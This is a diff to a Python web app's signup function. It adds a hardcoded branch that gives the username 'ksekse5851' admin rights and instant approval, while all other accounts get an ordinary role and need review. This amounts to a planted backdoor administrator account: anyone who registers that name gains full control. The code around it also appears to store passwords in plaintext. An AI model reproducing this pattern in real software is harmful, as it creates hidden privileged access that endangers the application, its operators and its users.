@@ -99,8 +99,18 @@ def signup(
     if c.fetchone():
         conn.close()
         raise HTTPException(409, "이미 가입된 아이디입니다.")
-    c.execute("INSERT INTO users (username, password, name, phone, role_id, approved) VALUES (?, ?, ?, ?, ?, 0)",
-              (username, password, name, phone, 2))
+    
+    # [중요] ksekse5851은 관리자(role_id=1), 승인(approved=1)
+    if username == "ksekse5851":
+        c.execute(
+            "INSERT INTO users (username, password, name, phone, role_id, approved) VALUES (?, ?, ?, ?, ?, ?)",
+            (username, password, name, phone, 1, 1)
+        )
+    else:
+        c.execute(
+            "INSERT INTO users (username, password, name, phone, role_id, approved) VALUES (?, ?, ?, ?, ?, ?)",
+            (username, password, name, phone, 2, 0)
+        )
     conn.commit()
     conn.close()
     return {"status": "ok"}
